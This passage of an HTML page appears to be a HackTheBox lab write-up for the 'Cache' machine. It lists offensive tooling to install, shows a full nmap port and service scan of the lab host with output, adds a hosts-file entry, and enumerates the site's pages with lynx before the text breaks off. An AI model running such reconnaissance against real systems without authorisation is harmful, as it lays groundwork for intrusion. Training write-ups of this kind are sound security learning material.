<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-HackTheBox/Cache/write-up">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Cache | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/HackTheBox/Cache/write-up/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Cache | CyFun"><meta data-rh="true" name="description" content="- Name: Cache"><meta data-rh="true" property="og:description" content="- Name: Cache"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/HackTheBox/Cache/write-up/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Cache/write-up/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Cache/write-up/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Academy/write-up/">Academy</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Admirer/write-up/">Admirer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blunder/write-up/">Blunder</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Book/write-up/">Book</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Buff/write-up/">Buff</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache </a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Control/write-up/">Control</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/CyberSantaCTF/2021/write-up/">CyberSantaCTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Delivery/write-up/">Delivery</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Doctor/write-up/">Doctor</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ForwardSlash/write-up/">ForwardSlash</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Magic/write-up/">Magic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Mango/write-up/">Mango</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Nest/write-up/">Nest</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Obscurity/write-up/">Obscurity</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Omni/write-up/">Omni</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Oouch/write-up/">Oouch</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/OpenAdmin/write-up/">OpenAdmin</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Passage/write-up/">Passage</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Ready/write-up/">Ready</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Remote/write-up/">Remote</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ScriptKiddie/write-up/">ScriptKiddie</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tenet/write-up/">Tenet</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traceback/write-up/">Traceback</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Travel/write-up/">Travel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traverxec/write-up/">Traverxec</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/Tryhackme/0day/">Tryhackme</a></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Cache</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Cache </span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Information</h1><ul><li><strong>Name:</strong> Cache</li><li><strong>Profile:</strong> <a href="https://www.hackthebox.eu/home/machines/profile/251" target="_blank" rel="noopener noreferrer">www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><p><img loading="lazy" alt="Cache" src="/assets/images/cache-6dccd9a325f90ee668f926ecbf986b59.png" width="598" height="381" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">​</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ pacman -S nmap lynx ffuf exploitdb metasploit sqlmap john docker</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="network-enumeration">Network enumeration<a href="#network-enumeration" class="hash-link" aria-label="Direct link to Network enumeration" title="Direct link to Network enumeration">​</a></h3><p>Quick <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a> scan:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.80 scan initiated Fri Jun 12 13:19:40 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.188</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.188</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.021s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65533 closed ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT   STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssh-hostkey:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Cache</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Fri Jun 12 13:20:07 2020 -- 1 IP address (1 host up) scanned in 26.73 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s set the local domain in <code>/etc/hosts</code>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /etc/hosts | grep cache</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.188 cache.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="http-enumeration--discovery">HTTP enumeration &amp; discovery<a href="#http-enumeration--discovery" class="hash-link" aria-label="Direct link to HTTP enumeration &amp; discovery" title="Direct link to HTTP enumeration &amp; discovery">​</a></h3><p>Let&#x27;s see which pages are listed on the home page:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ lynx -dump -listonly -nonumbers http://cache.htb/index.html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://cache.htb/index.html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://cache.htb/news.html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://cache.htb/contactus.html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://cache.htb/login.html</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">http://cache.htb/author.html</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 